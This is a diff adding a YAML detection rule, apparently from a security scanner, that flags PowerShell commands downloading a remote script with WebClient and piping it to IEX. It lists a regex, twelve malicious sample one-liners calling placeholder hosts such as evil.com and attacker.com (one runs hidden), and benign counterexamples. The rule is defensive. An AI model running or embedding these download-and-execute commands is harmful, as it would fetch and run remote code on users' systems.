@@ -1,0 +1,33 @@
+name: critical-02b-download-iex-pipe
+severity: critical
+description: >
+  Detects WebClient.DownloadString piped to IEX. Classic ClickFix pattern for in-memory script execution.
+
+pattern: |
+  (?i)(IEX|Invoke-Expression).*New-Object.*WebClient.*Download(String|File).*(http|ftp)s?://|New-Object.*WebClient.*Download(String|File).*(http|ftp)s?://.*(IEX|Invoke-Expression|\|)
+
+malicious:
+  - '(New-Object Net.WebClient).DownloadString("http://evil.com/p.ps1") | IEX'
+  - "(New-Object Net.WebClient).DownloadString('https://malware.com/script.ps1') | Invoke-Expression"
+  - 'powershell -c "(New-Object Net.WebClient).DownloadString(''http://attacker.com/mal.ps1'') | IEX"'
+  - '(New-Object Net.WebClient).DownloadString("https://bad.com/payload.ps1")|IEX'
+  - 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/dropper.ps1")'
+  - 'powershell (New-Object Net.WebClient).DownloadString("http://attacker.com/p.ps1")|IEX'
+  - "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/clickfix.ps1')"
+  - "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://malware.com/implant.ps1')"
+  - "(New-Object System.Net.WebClient).DownloadString('http://attacker.com/stager.ps1')|IEX"
+  - "IEX ((New-Object Net.WebClient).DownloadString('https://bad.com/loader.ps1'))"
+  - 'powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/backdoor.ps1'')"'
+  - "iex (New-Object Net.WebClient).DownloadString('http://attacker.com/obfuscated.ps1')"
+
+benign:
+  - '(New-Object Net.WebClient).DownloadString("http://example.com/data.json")'
+  - '(New-Object Net.WebClient).DownloadFile("https://cdn.com/file.zip","download.zip")'
+  - "Get-Content script.ps1 | IEX"
+  - "Invoke-Expression $myVariable"
+  - "(New-Object System.Random).Next()"
+  - "$webclient = New-Object Net.WebClient"
+  - "(New-Object Net.WebClient).DownloadFile('https://releases.ubuntu.com/20.04/ubuntu.iso','ubuntu.iso')"
+  - "$data = (New-Object Net.WebClient).DownloadString('https://api.github.com/repos/user/repo')"
+  - "IEX (Get-Content .\\local-script.ps1 -Raw)"
+  - "$content | Invoke-Expression"
